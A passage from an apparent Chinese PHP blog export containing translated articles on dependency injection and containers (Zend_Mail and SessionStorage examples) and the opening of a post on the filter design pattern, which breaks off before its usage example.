<p>这篇文章是一系列关于依赖注入和PHP轻量级容器实现文章中的一部分：<br><a href="https://fabien.potencier.org/article/11/what-is-dependency-injection" target="_blank" rel="noopener">Part 1: What is Dependency Injection?</a><br><a href="https://fabien.potencier.org/article/12/do-you-need-a-dependency-injection-container" target="_blank" rel="noopener">Part 2: Do you need a Dependency Injection Container?</a><br><a href="https://fabien.potencier.org/article/13/introduction-to-the-symfony-service-container" target="_blank" rel="noopener">Part 3: Introduction to the Symfony Service Container</a><br><a href="https://fabien.potencier.org/article/14/symfony-service-container-using-a-builder-to-create-services" target="_blank" rel="noopener">Part 4: Symfony Service Container: Using a Builder to create Services</a><br><a href="https://fabien.potencier.org/article/15/symfony-service-container-using-xml-or-yaml-to-describe-services" target="_blank" rel="noopener">Part 5: Symfony Service Container: Using XML or YAML to describe Services</a><br><a href="https://fabien.potencier.org/article/16/symfony-service-container-the-need-for-speed" target="_blank" rel="noopener">Part 6: The Need for Speed</a></p>
</blockquote>
<p>在这系列第一篇关于依赖注入的文章里，我尝试给出了一个依赖注入的web实例，今天我将要谈谈依赖注入容器。</p>
<p>首先，先看看一句大胆的言论：“大多数情况下，你不需要一个依赖注入容器也能受益于依赖注入” </p>
<a id="more"></a>

<p>但是当你有很多对象需要解决很多依赖，一个依赖注入容器就会非常有用（想一想那些框架）。如果你记得第一篇文章的例子，创建一个User对象需要先创建一个SessionStorage对象。这不是什么大问题，但是你在你创建所需对象之前至少需要知道你所需要的依赖：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$storage &#x3D; new SessionStorage(&#39;SESSION_ID&#39;);</span><br><span class="line">$user &#x3D; new User($storage);</span><br></pre></td></tr></table></figure>
<p>在接下来的文章里面，我将会谈谈Symfony2框架里面对依赖注入容器的实现。但是有一点我想说清楚，这种实现和Symfony框架本身没有什么关系，我会采用Zend框架里面例子来阐述。</p>
<p>Zend框架里面的Mail库简化了邮件操作，使用PHP mail() 函数就能发送邮件，但是这不太灵活。值得感谢的是，通过提供一个transport对象就可以很容易改变这点。下面的这段代码就展示了创建一个使用Gmail账号发送邮件的Zend_Mail对象：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$transport &#x3D; new Zend_Mail_Transport_Smtp(&#39;smtp.gmail.com&#39;, array(</span><br><span class="line">  &#39;auth&#39;     &#x3D;&gt; &#39;login&#39;,</span><br><span class="line">  &#39;username&#39; &#x3D;&gt; &#39;foo&#39;,</span><br><span class="line">  &#39;password&#39; &#x3D;&gt; &#39;bar&#39;,</span><br><span class="line">  &#39;ssl&#39;      &#x3D;&gt; &#39;ssl&#39;,</span><br><span class="line">  &#39;port&#39;     &#x3D;&gt; 465,</span><br><span class="line">));</span><br><span class="line"></span><br><span class="line">$mailer &#x3D; new Zend_Mail();</span><br><span class="line">$mailer-&gt;setDefaultTransport($transport);</span><br></pre></td></tr></table></figure>

<p>一个依赖注入容器就是一个知道如何初始化和配置对象的容器。为了完成这个任务，它需要知道构造器参数和对象之间的关系。<br>下面是一段简单的硬编码的容器，针对之前的Zend_Mail例子：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">class Container</span><br><span class="line">&#123;</span><br><span class="line">  public function getMailTransport()</span><br><span class="line">  &#123;</span><br><span class="line">    return new Zend_Mail_Transport_Smtp(&#39;smtp.gmail.com&#39;, array(</span><br><span class="line">      &#39;auth&#39;     &#x3D;&gt; &#39;login&#39;,</span><br><span class="line">      &#39;username&#39; &#x3D;&gt; &#39;foo&#39;,</span><br><span class="line">      &#39;password&#39; &#x3D;&gt; &#39;bar&#39;,</span><br><span class="line">      &#39;ssl&#39;      &#x3D;&gt; &#39;ssl&#39;,</span><br><span class="line">      &#39;port&#39;     &#x3D;&gt; 465,</span><br><span class="line">    ));</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  public function getMailer()</span><br><span class="line">  &#123;</span><br><span class="line">    $mailer &#x3D; new Zend_Mail();</span><br><span class="line">    $mailer-&gt;setDefaultTransport($this-&gt;getMailTransport());</span><br><span class="line"></span><br><span class="line">    return $mailer;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>使用容器很简单：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$container &#x3D; new Container();</span><br><span class="line">$mailer &#x3D; $container-&gt;getMailer();</span><br></pre></td></tr></table></figure>

<p>当使用容器的时候，我们只需要一个mailer对象即可，我们不需要知道如何去创建，所有关于mailer对象创建的东西都被封装在容器内部。<br>但是，机智的读者可能会发现一个问题，容器里面都是硬编码的。所以我们需要进一步优化，添加一些参数，这样容器会更有用：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">class Container</span><br><span class="line">&#123;</span><br><span class="line">  protected $parameters &#x3D; array();</span><br><span class="line"></span><br><span class="line">  public function __construct(array $parameters &#x3D; array())</span><br><span class="line">  &#123;</span><br><span class="line">    $this-&gt;parameters &#x3D; $parameters;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  public function getMailTransport()</span><br><span class="line">  &#123;</span><br><span class="line">    return new Zend_Mail_Transport_Smtp(&#39;smtp.gmail.com&#39;, array(</span><br><span class="line">      &#39;auth&#39;     &#x3D;&gt; &#39;login&#39;,</span><br><span class="line">      &#39;username&#39; &#x3D;&gt; $this-&gt;parameters[&#39;mailer.username&#39;],</span><br><span class="line">      &#39;password&#39; &#x3D;&gt; $this-&gt;parameters[&#39;mailer.password&#39;],</span><br><span class="line">      &#39;ssl&#39;      &#x3D;&gt; &#39;ssl&#39;,</span><br><span class="line">      &#39;port&#39;     &#x3D;&gt; 465,</span><br><span class="line">    ));</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  public function getMailer()</span><br><span class="line">  &#123;</span><br><span class="line">    $mailer &#x3D; new Zend_Mail();</span><br><span class="line">    $mailer-&gt;setDefaultTransport($this-&gt;getMailTransport());</span><br><span class="line"></span><br><span class="line">    return $mailer;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>现在你就很容易通过构造函数传递用户名和密码等参数：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$container &#x3D; new Container(array(</span><br><span class="line">  &#39;mailer.username&#39; &#x3D;&gt; &#39;foo&#39;,</span><br><span class="line">  &#39;mailer.password&#39; &#x3D;&gt; &#39;bar&#39;,</span><br><span class="line">));</span><br><span class="line">$mailer &#x3D; $container-&gt;getMailer();</span><br></pre></td></tr></table></figure>
<p>如果你需要改变mailer类来测试，对象的名字也可以通过参数来传递：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">class Container</span><br><span class="line">&#123;</span><br><span class="line">  &#x2F;&#x2F; ...</span><br><span class="line"></span><br><span class="line">  public function getMailer()</span><br><span class="line">  &#123;</span><br><span class="line">    $class &#x3D; $this-&gt;parameters[&#39;mailer.class&#39;];</span><br><span class="line"></span><br><span class="line">    $mailer &#x3D; new $class();</span><br><span class="line">    $mailer-&gt;setDefaultTransport($this-&gt;getMailTransport());</span><br><span class="line"></span><br><span class="line">    return $mailer;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$container &#x3D; new Container(array(</span><br><span class="line">  &#39;mailer.username&#39; &#x3D;&gt; &#39;foo&#39;,</span><br><span class="line">  &#39;mailer.password&#39; &#x3D;&gt; &#39;bar&#39;,</span><br><span class="line">  &#39;mailer.class&#39;    &#x3D;&gt; &#39;Zend_Mail&#39;,</span><br><span class="line">));</span><br><span class="line">$mailer &#x3D; $container-&gt;getMailer();</span><br></pre></td></tr></table></figure>
<p>最后，但不是最少，每次我想要一个mailer，我不必新建一个实例，所以容器可以被改造成每次返回同一个对象：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">class Container</span><br><span class="line">&#123;</span><br><span class="line">  static protected $shared &#x3D; array();</span><br><span class="line"></span><br><span class="line">  &#x2F;&#x2F; ...</span><br><span class="line"></span><br><span class="line">  public function getMailer()</span><br><span class="line">  &#123;</span><br><span class="line">    if (isset(self::$shared[&#39;mailer&#39;]))</span><br><span class="line">    &#123;</span><br><span class="line">      return self::$shared[&#39;mailer&#39;];</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    $class &#x3D; $this-&gt;parameters[&#39;mailer.class&#39;];</span><br><span class="line"></span><br><span class="line">    $mailer &#x3D; new $class();</span><br><span class="line">    $mailer-&gt;setDefaultTransport($this-&gt;getMailTransport());</span><br><span class="line"></span><br><span class="line">    return self::$shared[&#39;mailer&#39;] &#x3D; $mailer;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>通过引入一个静态的$shared属性，每次你调用getMailer()都会返回第一次创建的对象</p>
<p>容器包装了需要实现的基本特性，依赖注入容器管理对象：从初始化到配置。对象本身不知道自己被容器管理，更不知道容器。所以容器可以管理任何PHP对象，如果对象使用依赖注入解决依赖就更好了，但那不是先决条件。</p>
<p>当然，通过手动创建和维护容器类可能会成为噩梦。但是一个可以使用的容器的要求还是很低的，很容易实现。下一章我会介绍Symfony2框架里面依赖注入的实现</p>
]]></content>
      <categories>
        <category>PHP</category>
      </categories>
      <tags>
        <tag>PHP</tag>
        <tag>依赖注入</tag>
      </tags>
  </entry>
  <entry>
    <title>一、什么是依赖注入？</title>
    <url>/2017/coding/php/php-di-what-is.html</url>
    <content><![CDATA[<blockquote>
<p>此文是本人翻译的来自国外某网站一篇文章 <a href="https://fabien.potencier.org/what-is-dependency-injection.html" target="_blank" rel="noopener">What is Dependency Injection?</a>,第一次翻译，各位见谅</p>
</blockquote>
<blockquote>
<p>这篇文章是一系列关于依赖注入和PHP轻量级容器实现文章中的一部分：<br><a href="https://fabien.potencier.org/article/11/what-is-dependency-injection" target="_blank" rel="noopener">Part 1: What is Dependency Injection?</a><br><a href="https://fabien.potencier.org/article/12/do-you-need-a-dependency-injection-container" target="_blank" rel="noopener">Part 2: Do you need a Dependency Injection Container?</a><br><a href="https://fabien.potencier.org/article/13/introduction-to-the-symfony-service-container" target="_blank" rel="noopener">Part 3: Introduction to the Symfony Service Container</a><br><a href="https://fabien.potencier.org/article/14/symfony-service-container-using-a-builder-to-create-services" target="_blank" rel="noopener">Part 4: Symfony Service Container: Using a Builder to create Services</a><br><a href="https://fabien.potencier.org/article/15/symfony-service-container-using-xml-or-yaml-to-describe-services" target="_blank" rel="noopener">Part 5: Symfony Service Container: Using XML or YAML to describe Services</a><br><a href="https://fabien.potencier.org/article/16/symfony-service-container-the-need-for-speed" target="_blank" rel="noopener">Part 6: The Need for Speed</a></p>
</blockquote>
<p>今天，我一开始不会讲容器，我希望先通过一些具体的实例来介绍一下依赖注入的理念以及其所尝试解决的问题和它能给开发者带来的好处。如果你已经了解依赖注入，你可以跳过这篇文章去看下一篇。<br>依赖注入可能是我知道的最简单的设计模式之一，很可能你已经使用过，但是同时也是最难解释的，原因可能是大多数介绍依赖注入的文章用的例子都比较无聊。我想了一个比较适合PHP领域的例子，因为PHP主要用在web开发，所以让我们来看一个简单的web实例。<br>为了解决http协议无状态的问题，web应用需要一种在web请求之间记录用户信息的方法，简单的通过cookie或者session都能解决：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$_SESSION[&#39;language&#39;] &#x3D; &#39;fr&#39;;</span><br></pre></td></tr></table></figure>

<a id="more"></a>

<p>上面的代码把用户的语言存在了session变量里面。这样，对于同一个用户的请求，其所使用的语言就会被存储在$_SESSION数组里面，我们可以这样获取：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$user_language &#x3D; $_SESSION[&#39;language&#39;];</span><br></pre></td></tr></table></figure>
<p>由于依赖注入只在面向对象的世界里有意义，我们假装我们有一个叫SessionStorage的类封装了处理session的方法：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">class SessionStorage</span><br><span class="line">&#123;</span><br><span class="line">  function __construct($cookieName &#x3D; &#39;PHP_SESS_ID&#39;)</span><br><span class="line">  &#123;</span><br><span class="line">    session_name($cookieName);</span><br><span class="line">    session_start();</span><br><span class="line">  &#125;</span><br><span class="line">  function set($key, $value)</span><br><span class="line">  &#123;</span><br><span class="line">    $_SESSION[$key] &#x3D; $value;</span><br><span class="line">  &#125;</span><br><span class="line">  function get($key)</span><br><span class="line">  &#123;</span><br><span class="line">    return $_SESSION[$key];</span><br><span class="line">  &#125;</span><br><span class="line">  &#x2F;&#x2F; ...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>…和一个提供高级接口的易用的User类</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">class User</span><br><span class="line">&#123;</span><br><span class="line">  protected $storage;</span><br><span class="line"></span><br><span class="line">  function __construct()</span><br><span class="line">  &#123;</span><br><span class="line">    $this-&gt;storage &#x3D; new SessionStorage();</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  function setLanguage($language)</span><br><span class="line">  &#123;</span><br><span class="line">    $this-&gt;storage-&gt;set(&#39;language&#39;, $language);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  function getLanguage()</span><br><span class="line">  &#123;</span><br><span class="line">    return $this-&gt;storage-&gt;get(&#39;language&#39;);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  &#x2F;&#x2F; ...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>这些类足够简单，使用User类也非常容易：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$user &#x3D; new User();</span><br><span class="line">$user-&gt;setLanguage(&#39;fr&#39;);</span><br><span class="line">$user_language &#x3D; $user-&gt;getLanguage();</span><br></pre></td></tr></table></figure>
<p>到目前为止，一切都很好…除非你想要更多的灵活性。万一你想要改变session里面的cookie名字呢？你可能会使用下面这些方法：</p>
<ol>
<li>在SessionStorage构造器里面硬编码名字<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">class User</span><br><span class="line">  &#123;</span><br><span class="line">    function __construct()</span><br><span class="line">    &#123;</span><br><span class="line">      $this-&gt;storage &#x3D; new SessionStorage(&#39;SESSION_ID&#39;);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    &#x2F;&#x2F; ...</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure></li>
<li>在User类外面定义一个常量<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">define(&#39;STORAGE_SESSION_NAME&#39;, &#39;SESSION_ID&#39;);</span><br><span class="line">class User</span><br><span class="line">   &#123;</span><br><span class="line">     function __construct()</span><br><span class="line">     &#123;</span><br><span class="line">       $this-&gt;storage &#x3D; new SessionStorage(STORAGE_SESSION_NAME);</span><br><span class="line">     &#125;</span><br><span class="line"></span><br><span class="line">     &#x2F;&#x2F; ...</span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure></li>
<li>在User类构造器里面传递一个名字作为参数<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">class User</span><br><span class="line">   &#123;</span><br><span class="line">     function __construct($sessionName)</span><br><span class="line">     &#123;</span><br><span class="line">       $this-&gt;storage &#x3D; new SessionStorage($sessionName);</span><br><span class="line">     &#125;</span><br><span class="line"></span><br><span class="line">     &#x2F;&#x2F; ...</span><br><span class="line">   &#125;</span><br><span class="line"></span><br><span class="line">   $user &#x3D; new User(&#39;SESSION_ID&#39;);</span><br></pre></td></tr></table></figure></li>
<li>在User类构造器里面传递一个数组选项<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">class User</span><br><span class="line">&#123;</span><br><span class="line">  function __construct($storageOptions)</span><br><span class="line">  &#123;</span><br><span class="line">    $this-&gt;storage &#x3D; new SessionStorage($storageOptions[&#39;session_name&#39;]);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  &#x2F;&#x2F; ...</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$user &#x3D; new User(array(&#39;session_name&#39; &#x3D;&gt; &#39;SESSION_ID&#39;));</span><br></pre></td></tr></table></figure>

</li>
</ol>
<p>以上的所有选择都很烂，硬编码名字没有真正解决问题因为你以后可能随时会改变注意，你还得更改User类。使用常量也是一个坏注意，因为你又依赖了一个常量。通过传递一个数组参数可能是一个好的解决方案，但是依然不太好，它把User构造器和一个和它本身不相关的东西耦合了。<br>而且还有一个问题没法容易搞定：我怎么换掉SessionStorage类？比方说，用一个mock对象去测试，或者你想把session保存在数据库或内存里面。在目前的代码里面除非你更改User类，否则无法实现。</p>
<h3 id="依赖注入"><a href="#依赖注入" class="headerlink" title="依赖注入"></a>依赖注入</h3><p>不要在User类里面创建SessionStorage对象，我们在类外面创建SessionStorage对象，然后通过构造函数把其作为参数传进来：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">class User</span><br><span class="line">&#123;</span><br><span class="line">  function __construct($storage)</span><br><span class="line">  &#123;</span><br><span class="line">    $this-&gt;storage &#x3D; $storage;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  &#x2F;&#x2F; ...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>这就是依赖注入,就是这些！</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$storage &#x3D; new SessionStorage(&#39;SESSION_ID&#39;);</span><br><span class="line">$user &#x3D; new User($storage);</span><br></pre></td></tr></table></figure>
<p>现在，配置一个session存储对象非常简单了，替换它也很容易，不用改变User类也可以实现其他功能。<br> <a href="https://www.picocontainer.org/injection.html" target="_blank" rel="noopener">Pico Container website</a> 这样形容依赖注入：“依赖注入就是通过构造器、方法、属性获取所需要的元素”<br>依赖注入不仅仅局限于此：</p>
<ul>
<li>构造器注入：<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">class User</span><br><span class="line">  &#123;</span><br><span class="line">    function __construct($storage)</span><br><span class="line">    &#123;</span><br><span class="line">      $this-&gt;storage &#x3D; $storage;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    &#x2F;&#x2F; ...</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure></li>
<li>Setter注入：<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">class User</span><br><span class="line">  &#123;</span><br><span class="line">    function setSessionStorage($storage)</span><br><span class="line">    &#123;</span><br><span class="line">      $this-&gt;storage &#x3D; $storage;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    &#x2F;&#x2F; ...</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure></li>
<li>属性注入：<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">class User</span><br><span class="line">  &#123;</span><br><span class="line">    public $sessionStorage;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  $user-&gt;sessionStorage &#x3D; $storage;</span><br></pre></td></tr></table></figure>

</li>
</ul>
<p>一般来说，构造器注入最适合必要依赖，就像例子里面那样，Setter注入比较适合可选依赖，比如说缓存对象。当今，很多现代PHP框架大量使用依赖注入提供一系列既解耦又有凝聚力的组件：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;&#x2F; symfony: A constructor injection example</span><br><span class="line">$dispatcher &#x3D; new sfEventDispatcher();</span><br><span class="line">$storage &#x3D; new sfMySQLSessionStorage(array(&#39;database&#39; &#x3D;&gt; &#39;session&#39;, &#39;db_table&#39; &#x3D;&gt; &#39;session&#39;));</span><br><span class="line">$user &#x3D; new sfUser($dispatcher, $storage, array(&#39;default_culture&#39; &#x3D;&gt; &#39;en&#39;));</span><br><span class="line">&#x2F;&#x2F; Zend Framework: A setter injection example</span><br><span class="line">$transport &#x3D; new Zend_Mail_Transport_Smtp(&#39;smtp.gmail.com&#39;, array(</span><br><span class="line">  &#39;auth&#39;     &#x3D;&gt; &#39;login&#39;,</span><br><span class="line">  &#39;username&#39; &#x3D;&gt; &#39;foo&#39;,</span><br><span class="line">  &#39;password&#39; &#x3D;&gt; &#39;bar&#39;,</span><br><span class="line">  &#39;ssl&#39;      &#x3D;&gt; &#39;ssl&#39;,</span><br><span class="line">  &#39;port&#39;     &#x3D;&gt; 465,</span><br><span class="line">));</span><br><span class="line">$mailer &#x3D; new Zend_Mail();</span><br><span class="line">$mailer-&gt;setDefaultTransport($transport);</span><br></pre></td></tr></table></figure>

<p>如果你想了解更多关于依赖注入的东西，我强烈建议你读一读<a href="https://www.martinfowler.com/articles/injection.html" target="_blank" rel="noopener">Martin Fowler introduction</a> 或者 <a href="https://www.procata.com/talks/phptek-may2007-dependency.pdf" target="_blank" rel="noopener">Jeff More presentation</a>。你也可以看看我去年关于依赖注入的<a href="https://fabien.potencier.org/talk/19/decouple-your-code-for-reusability-ipc-2008" target="_blank" rel="noopener">演讲</a>,这里讲了更多细节</p>
<p>好了，就说这么多了，我希望你现在对依赖注入有更好的理解，本系列的下一章我会讲关于依赖注入容器</p>
]]></content>
      <categories>
        <category>PHP</category>
      </categories>
      <tags>
        <tag>PHP</tag>
        <tag>依赖注入</tag>
      </tags>
  </entry>
  <entry>
    <title>PHP设计模式之过滤器模式</title>
    <url>/2017/coding/php/php-designpattern-filter.html</url>
    <content><![CDATA[<h1 id="过滤器模式"><a href="#过滤器模式" class="headerlink" title="过滤器模式"></a>过滤器模式</h1><blockquote>
<p>过滤器模式（Filter Pattern）或标准模式（Criteria Pattern）是一种设计模式，这种模式允许开发人员使用不同的标准来过滤一组对象，通过逻辑运算以解耦的方式把它们连接起来。这种类型的设计模式属于结构型模式，它结合多个标准来获得单一标准。</p>
</blockquote>
<p>日常生活中也有过滤器，这个比较容易理解，就是使用设备过滤出自己想要的，去掉那些不符合条件的。但是在编程里面是怎么实现的呢？</p>
<p>举个例子，有一组用户参与抽奖活动，我们需要筛选一部分符合条件的用户抽奖，其它不符合条件的用户咱直接提示未中奖！比如说需要注册时间大于3个月、消费金额大于100元、没有违规行为、活跃度大约500、性别为女。。。等条件！</p>
<p>有人说问为什么不使用数据库筛选，一条sql数据就搞定了啊，实际上有可能是因为这些数据并不是在一个表里面，有些数据可能需要计算得出。</p>
<a id="more"></a>

<p>普通写法：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">循环所有用户...</span><br><span class="line"><span class="keyword">if</span> 注册时间 &lt; <span class="number">3</span>个月 &#123;</span><br><span class="line">    出局;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> 消费金额 &lt; <span class="number">100</span> &#123;</span><br><span class="line">    出局;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>这种写法没问题，写业务代码的时候大部分都是这么做，但是如果当你的业务逻辑十分复杂的时候，这样写容易乱，不容易维护。</p>
<p>下面展示使用过滤器模式的写法：</p>
<p>首先，我们需要一个用户类：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">App</span>\<span class="title">Filter</span>;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">User</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> $id;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> $name;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> $age;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> $gender;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($id, $name, $age, $gender)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;id     = $id;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;name   = $name;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;age    = $age;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;gender = $gender;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@return</span> mixed</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">getName</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;name;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> mixed $name</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">setName</span><span class="params">($name)</span>: <span class="title">void</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;name = $name;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@return</span> mixed</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">getAge</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;age;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> mixed $age</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">setAge</span><span class="params">($age)</span>: <span class="title">void</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;age = $age;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@return</span> mixed</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">getGender</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;gender;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> mixed $gender</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">setGender</span><span class="params">($gender)</span>: <span class="title">void</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;gender = $gender;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>Filter接口：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">App</span>\<span class="title">Filter</span>;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">interface</span> <span class="title">Filter</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">filter</span><span class="params">(array $users)</span>: <span class="title">array</span></span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>AgeFiler:</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">App</span>\<span class="title">Filter</span>;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">AgeFilter</span> <span class="keyword">implements</span> <span class="title">Filter</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">filter</span><span class="params">(array $users)</span>: <span class="title">array</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        $result = [];</span><br><span class="line"></span><br><span class="line">        <span class="keyword">foreach</span> ($users <span class="keyword">as</span> $user) &#123;</span><br><span class="line">            <span class="keyword">if</span> ($user-&gt;getAge() &gt; <span class="number">25</span>) &#123;</span><br><span class="line">                $result[] = $user;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> $result;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>MaleFilter:</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">App</span>\<span class="title">Filter</span>;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">MaleFilter</span> <span class="keyword">implements</span> <span class="title">Filter</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">filter</span><span class="params">(array $users)</span>: <span class="title">array</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        $result = [];</span><br><span class="line"></span><br><span class="line">        <span class="keyword">foreach</span> ($users <span class="keyword">as</span> $user) &#123;</span><br><span class="line">            <span class="keyword">if</span> ($user-&gt;getGender() == <span class="string">'男'</span>) &#123;</span><br><span class="line">                $result[] = $user;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> $result;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>最后使用：</p>
